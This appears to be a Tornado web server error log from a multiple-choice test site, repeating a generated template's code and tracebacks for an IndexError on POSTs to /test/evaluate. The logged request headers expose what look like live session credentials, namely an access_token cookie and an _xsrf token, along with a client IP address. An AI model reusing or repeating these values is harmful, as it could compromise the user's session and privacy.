 33          _tmp = question.options[1]  # ui-modules/question.html:36
 34          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:36
 35          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:36
 36          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:36
 37          _append(_tmp)  # ui-modules/question.html:36
 38          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third">')  # ui-modules/question.html:40
 39          _tmp = question.options[2]  # ui-modules/question.html:40
 40          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:40
 41          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:40
 42          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:40
 43          _append(_tmp)  # ui-modules/question.html:40
 44          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth">')  # ui-modules/question.html:44
 45          _tmp = question.options[3]  # ui-modules/question.html:44
 46          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:44
 47          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:44
 48          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:44
 49          _append(_tmp)  # ui-modules/question.html:44
 50          _append('</td>\n</tr>\n</tbody>\n</table>\n')  # ui-modules/question.html:48
 51      else:  # ui-modules/question.html:48
 52          _append('\n<div id="left">\n<div id="object1">\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style="width: 5%; padding-top: 13px;"><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first" style="width: 40%; padding-top: 14px;">')  # ui-modules/question.html:61
 53          _tmp = question.options[0]  # ui-modules/question.html:61
 54          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:61
 55          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:61
 56          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:61
 57          _append(_tmp)  # ui-modules/question.html:61
 58          _append('\n</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second" style="padding-top: 14px;">')  # ui-modules/question.html:66
 59          _tmp = question.options[1]  # ui-modules/question.html:66
 60          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:66
 61          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:66
 62          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:66
 63          _append(_tmp)  # ui-modules/question.html:66
 64          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third" style="padding-top: 14px;">')  # ui-modules/question.html:70
 65          _tmp = question.options[2]  # ui-modules/question.html:70
 66          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:70
 67          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:70
 68          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:70
 69          _append(_tmp)  # ui-modules/question.html:70
 70          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth" style="padding-top: 14px;">')  # ui-modules/question.html:74
 71          _tmp = question.options[3]  # ui-modules/question.html:74
 72          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:74
 73          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:74
 74          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:74
 75          _append(_tmp)  # ui-modules/question.html:74
 76          _append('</td>\n</tbody>\n</table>\n</div>\n</div>\n<div id="right">\n<div id="object3"><img src="/static/imgs/')  # ui-modules/question.html:81
 77          _tmp = question.image  # ui-modules/question.html:81
 78          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:81
 79          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:81
 80          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:81
 81          _append(_tmp)  # ui-modules/question.html:81
 82          _append('" alt="some_text"/></div>\n</div>\n')  # ui-modules/question.html:83
 83      _append('\n<ul class="pager">\n<li class="previous">\n<a href="#">&larr; Previous</a>\n</li>\n<li class="next" cursor="')  # ui-modules/question.html:89
 84      _tmp = test.cursor  # ui-modules/question.html:89
 85      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 86      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 87      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 88      _append(_tmp)  # ui-modules/question.html:89
 89      _append('" tid="')  # ui-modules/question.html:89
 90      _tmp = test.id  # ui-modules/question.html:89
 91      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 92      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 93      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 94      _append(_tmp)  # ui-modules/question.html:89
 95      _append('" remaining-answers="')  # ui-modules/question.html:89
 96      _tmp = len(question.answer)  # ui-modules/question.html:89
 97      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 98      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 99      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
100      _append(_tmp)  # ui-modules/question.html:89
101      _append('">\n<a href="#">Next &rarr;</a>\n</li>\n</ul>\n</div>\n</div>\n')  # ui-modules/question.html:100
102      return _utf8('').join(_buffer)  # ui-modules/question.html:0
ERROR:root:Uncaught exception POST /test/evaluate (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='POST', uri='/test/evaluate', version='HTTP/1.0', remote_ip='127.0.0.1', body='tid=5059c06b8e4c8548017fb423&answers=%5B2%2C3%5D&cursor=10&_xsrf=0a1bb57f460240a19b40cff76ef2297a', headers={'Origin': 'http://www.intheory.co.uk', 'Content-Length': '97', 'Accept-Language': 'en-GB,en-US;q=0.8,en;q=0.6', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.57 Safari/537.1', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'Referer': 'http://www.intheory.co.uk/test/new', 'X-Real-Ip': '83.244.221.226', 'Cookie': '_xsrf=0a1bb57f460240a19b40cff76ef2297a; access_token="QUFBRzZsTmNzNkdjQkFNZFlKbDk0MDJKd1B1UHNVaGk3dGdGdGczNG1qMzVDMnN5STJPMWxEaUQ4UW04WkJIWkFkNGlpTmV2UnVVVDQxclM1WFpBVHZFOXFFY1hJdzY3V0ZlU2txQ3hmUVpEWkQ=|1348053554|ac07d46d67d8ee02d32f8ff95325dfe712d40b21"; __utma=188782963.1555786485.1347973685.1348053519.1348059227.3; __utmb=188782963.2.10.1348059227; __utmc=188782963; __utmz=188782963.1347973685.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 102, in post
    self._execute_request(self.on_post, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 221, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 226, in _execute_on_success
    self.on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/test.py", line 58, in on_success
    self.xhr_response.update({"html": self.render_string("ui-modules/question.html", test=mt)})
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 615, in render_string
    return t.generate(**args)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/template.py", line 254, in generate
    return execute()
  File "ui-modules/question_html.generated.py", line 45, in _execute
    _tmp = question.options[3]  # ui-modules/question.html:44
IndexError: list index out of range
ERROR:root:500 POST /test/evaluate (127.0.0.1) 74.33ms
ERROR:root:ui-modules/question.html code:
  1  def _execute():  # ui-modules/question.html:0
  2      _buffer = []  # ui-modules/question.html:0
  3      _append = _buffer.append  # ui-modules/question.html:0
  4      _append('<div class="hero-unit">\n<div class="hero-unit1">\n')  # ui-modules/question.html:4
  5      question = test.questions[test.cursor]  # ui-modules/question.html:4
  6      _append('\n<div class="image123"><img alt="" src="')  # ui-modules/question.html:5
  7      _tmp = static_url('imgs/questionbg.png')  # ui-modules/question.html:5
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:5
  9      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:5
 10      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:5
 11      _append(_tmp)  # ui-modules/question.html:5
 12      _append('" />\n<div class="text">\n<div class="verticalalign" style="display: table; height: 100px; #position: relative; overflow: hidden;">\n<div style=" #position: absolute; #top: 50%;display: table-cell; vertical-align: middle;">\n<div class="greenBorder" style=" #position: relative; #top: -50%">\n<p><font color="#FFFFFF"><b>')  # ui-modules/question.html:11
 13      _tmp = question.question  # ui-modules/question.html:11
 14      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:11
 15      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:11
 16      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:11
 17      _append(_tmp)  # ui-modules/question.html:11
 18      _append('</b></font></p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</br></br></br></br></br>\n<div class="progress progress-striped">\n<div class="bar bar-success progress-striped" style="width: ')  # ui-modules/question.html:19
 19      _tmp = 100*test.cursor/len(test.questions)  # ui-modules/question.html:19
 20      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:19
 21      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:19
 22      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:19
 23      _append(_tmp)  # ui-modules/question.html:19
 24      _append('%">\n</div>\n</div>\n')  # ui-modules/question.html:22
 25      if not question.image:  # ui-modules/question.html:22
 26          _append('\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first">')  # ui-modules/question.html:32
 27          _tmp = question.options[0]  # ui-modules/question.html:32
 28          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:32
 29          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:32
 30          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:32
 31          _append(_tmp)  # ui-modules/question.html:32
 32          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second">')  # ui-modules/question.html:36
 33          _tmp = question.options[1]  # ui-modules/question.html:36
 34          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:36
 35          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:36
 36          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:36
 37          _append(_tmp)  # ui-modules/question.html:36
 38          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third">')  # ui-modules/question.html:40
 39          _tmp = question.options[2]  # ui-modules/question.html:40
 40          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:40
 41          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:40
 42          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:40
 43          _append(_tmp)  # ui-modules/question.html:40
 44          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth">')  # ui-modules/question.html:44
 45          _tmp = question.options[3]  # ui-modules/question.html:44
 46          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:44
 47          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:44
 48          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:44
 49          _append(_tmp)  # ui-modules/question.html:44
 50          _append('</td>\n</tr>\n</tbody>\n</table>\n')  # ui-modules/question.html:48
 51      else:  # ui-modules/question.html:48
 52          _append('\n<div id="left">\n<div id="object1">\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style="width: 5%; padding-top: 13px;"><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first" style="width: 40%; padding-top: 14px;">')  # ui-modules/question.html:61
 53          _tmp = question.options[0]  # ui-modules/question.html:61
 54          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:61
 55          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:61
 56          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:61
 57          _append(_tmp)  # ui-modules/question.html:61
 58          _append('\n</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second" style="padding-top: 14px;">')  # ui-modules/question.html:66
 59          _tmp = question.options[1]  # ui-modules/question.html:66
 60          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:66
 61          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:66
 62          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:66
 63          _append(_tmp)  # ui-modules/question.html:66
 64          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third" style="padding-top: 14px;">')  # ui-modules/question.html:70
 65          _tmp = question.options[2]  # ui-modules/question.html:70
 66          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:70
 67          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:70
 68          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:70
 69          _append(_tmp)  # ui-modules/question.html:70
 70          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth" style="padding-top: 14px;">')  # ui-modules/question.html:74
 71          _tmp = question.options[3]  # ui-modules/question.html:74
 72          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:74
 73          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:74
 74          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:74
 75          _append(_tmp)  # ui-modules/question.html:74
 76          _append('</td>\n</tbody>\n</table>\n</div>\n</div>\n<div id="right">\n<div id="object3"><img src="/static/imgs/')  # ui-modules/question.html:81
 77          _tmp = question.image  # ui-modules/question.html:81
 78          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:81
 79          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:81
 80          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:81
 81          _append(_tmp)  # ui-modules/question.html:81
 82          _append('" alt="some_text"/></div>\n</div>\n')  # ui-modules/question.html:83
 83      _append('\n<ul class="pager">\n<li class="previous">\n<a href="#">&larr; Previous</a>\n</li>\n<li class="next" cursor="')  # ui-modules/question.html:89
 84      _tmp = test.cursor  # ui-modules/question.html:89
 85      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 86      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 87      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 88      _append(_tmp)  # ui-modules/question.html:89
 89      _append('" tid="')  # ui-modules/question.html:89
 90      _tmp = test.id  # ui-modules/question.html:89
 91      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 92      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 93      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 94      _append(_tmp)  # ui-modules/question.html:89
 95      _append('" remaining-answers="')  # ui-modules/question.html:89
 96      _tmp = len(question.answer)  # ui-modules/question.html:89
 97      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 98      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 99      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
100      _append(_tmp)  # ui-modules/question.html:89
101      _append('">\n<a href="#">Next &rarr;</a>\n</li>\n</ul>\n</div>\n</div>\n')  # ui-modules/question.html:100
102      return _utf8('').join(_buffer)  # ui-modules/question.html:0
ERROR:root:Uncaught exception POST /test/evaluate (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='POST', uri='/test/evaluate', version='HTTP/1.0', remote_ip='127.0.0.1', body='tid=5059c06b8e4c8548017fb423&answers=%5B0%5D&cursor=14&_xsrf=0a1bb57f460240a19b40cff76ef2297a', headers={'Origin': 'http://www.intheory.co.uk', 'Content-Length': '93', 'Accept-Language': 'en-GB,en-US;q=0.8,en;q=0.6', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.57 Safari/537.1', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'Referer': 'http://www.intheory.co.uk/test/new', 'X-Real-Ip': '83.244.221.226', 'Cookie': '_xsrf=0a1bb57f460240a19b40cff76ef2297a; access_token="QUFBRzZsTmNzNkdjQkFNZFlKbDk0MDJKd1B1UHNVaGk3dGdGdGczNG1qMzVDMnN5STJPMWxEaUQ4UW04WkJIWkFkNGlpTmV2UnVVVDQxclM1WFpBVHZFOXFFY1hJdzY3V0ZlU2txQ3hmUVpEWkQ=|1348053554|ac07d46d67d8ee02d32f8ff95325dfe712d40b21"; __utma=188782963.1555786485.1347973685.1348053519.1348059227.3; __utmb=188782963.2.10.1348059227; __utmc=188782963; __utmz=188782963.1347973685.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 102, in post
    self._execute_request(self.on_post, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 221, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 226, in _execute_on_success
    self.on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/test.py", line 58, in on_success
    self.xhr_response.update({"html": self.render_string("ui-modules/question.html", test=mt)})
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 615, in render_string
    return t.generate(**args)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/template.py", line 254, in generate
    return execute()
  File "ui-modules/question_html.generated.py", line 45, in _execute
    _tmp = question.options[3]  # ui-modules/question.html:44
IndexError: list index out of range
ERROR:root:500 POST /test/evaluate (127.0.0.1) 76.97ms
ERROR:root:ui-modules/question.html code:
  1  def _execute():  # ui-modules/question.html:0
  2      _buffer = []  # ui-modules/question.html:0
  3      _append = _buffer.append  # ui-modules/question.html:0
  4      _append('<div class="hero-unit">\n<div class="hero-unit1">\n')  # ui-modules/question.html:4
  5      question = test.questions[test.cursor]  # ui-modules/question.html:4
  6      _append('\n<div class="image123"><img alt="" src="')  # ui-modules/question.html:5
  7      _tmp = static_url('imgs/questionbg.png')  # ui-modules/question.html:5
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:5
  9      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:5
 10      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:5
 11      _append(_tmp)  # ui-modules/question.html:5
 12      _append('" />\n<div class="text">\n<div class="verticalalign" style="display: table; height: 100px; #position: relative; overflow: hidden;">\n<div style=" #position: absolute; #top: 50%;display: table-cell; vertical-align: middle;">\n<div class="greenBorder" style=" #position: relative; #top: -50%">\n<p><font color="#FFFFFF"><b>')  # ui-modules/question.html:11
 13      _tmp = question.question  # ui-modules/question.html:11
 14      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:11
 15      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:11
 16      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:11
 17      _append(_tmp)  # ui-modules/question.html:11
 18      _append('</b></font></p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</br></br></br></br></br>\n<div class="progress progress-striped">\n<div class="bar bar-success progress-striped" style="width: ')  # ui-modules/question.html:19
 19      _tmp = 100*test.cursor/len(test.questions)  # ui-modules/question.html:19
 20      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:19
 21      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:19
 22      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:19
 23      _append(_tmp)  # ui-modules/question.html:19
 24      _append('%">\n</div>\n</div>\n')  # ui-modules/question.html:22
 25      if not question.image:  # ui-modules/question.html:22
 26          _append('\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first">')  # ui-modules/question.html:32
 27          _tmp = question.options[0]  # ui-modules/question.html:32
 28          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:32
 29          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:32
 30          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:32
 31          _append(_tmp)  # ui-modules/question.html:32
 32          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second">')  # ui-modules/question.html:36
 33          _tmp = question.options[1]  # ui-modules/question.html:36
 34          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:36
 35          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:36
 36          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:36
 37          _append(_tmp)  # ui-modules/question.html:36
 38          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third">')  # ui-modules/question.html:40
 39          _tmp = question.options[2]  # ui-modules/question.html:40
 40          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:40
 41          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:40
 42          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:40
 43          _append(_tmp)  # ui-modules/question.html:40
 44          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth">')  # ui-modules/question.html:44
 45          _tmp = question.options[3]  # ui-modules/question.html:44
 46          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:44
 47          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:44
 48          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:44
 49          _append(_tmp)  # ui-modules/question.html:44
 50          _append('</td>\n</tr>\n</tbody>\n</table>\n')  # ui-modules/question.html:48
 51      else:  # ui-modules/question.html:48
 52          _append('\n<div id="left">\n<div id="object1">\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style="width: 5%; padding-top: 13px;"><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first" style="width: 40%; padding-top: 14px;">')  # ui-modules/question.html:61
 53          _tmp = question.options[0]  # ui-modules/question.html:61
 54          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:61
 55          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:61
 56          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:61
 57          _append(_tmp)  # ui-modules/question.html:61
 58          _append('\n</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second" style="padding-top: 14px;">')  # ui-modules/question.html:66
 59          _tmp = question.options[1]  # ui-modules/question.html:66
 60          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:66
 61          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:66
 62          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:66
 63          _append(_tmp)  # ui-modules/question.html:66
 64          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third" style="padding-top: 14px;">')  # ui-modules/question.html:70
 65          _tmp = question.options[2]  # ui-modules/question.html:70
 66          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:70
 67          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:70
 68          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:70
 69          _append(_tmp)  # ui-modules/question.html:70
 70          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth" style="padding-top: 14px;">')  # ui-modules/question.html:74
 71          _tmp = question.options[3]  # ui-modules/question.html:74
 72          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:74
 73          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:74
 74          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:74
 75          _append(_tmp)  # ui-modules/question.html:74
 76          _append('</td>\n</tbody>\n</table>\n</div>\n</div>\n<div id="right">\n<div id="object3"><img src="/static/imgs/')  # ui-modules/question.html:81
 77          _tmp = question.image  # ui-modules/question.html:81
 78          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:81
 79          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:81
 80          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:81
 81          _append(_tmp)  # ui-modules/question.html:81
 82          _append('" alt="some_text"/></div>\n</div>\n')  # ui-modules/question.html:83
 83      _append('\n<ul class="pager">\n<li class="previous">\n<a href="#">&larr; Previous</a>\n</li>\n<li class="next" cursor="')  # ui-modules/question.html:89
 84      _tmp = test.cursor  # ui-modules/question.html:89
 85      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 86      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 87      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 88      _append(_tmp)  # ui-modules/question.html:89
 89      _append('" tid="')  # ui-modules/question.html:89
 90      _tmp = test.id  # ui-modules/question.html:89
 91      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 92      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 93      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 94      _append(_tmp)  # ui-modules/question.html:89
 95      _append('" remaining-answers="')  # ui-modules/question.html:89
 96      _tmp = len(question.answer)  # ui-modules/question.html:89
 97      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 98      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 99      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
100      _append(_tmp)  # ui-modules/question.html:89
101      _append('">\n<a href="#">Next &rarr;</a>\n</li>\n</ul>\n</div>\n</div>\n')  # ui-modules/question.html:100
102      return _utf8('').join(_buffer)  # ui-modules/question.html:0
ERROR:root:Uncaught exception POST /test/evaluate (127.0.0.1)
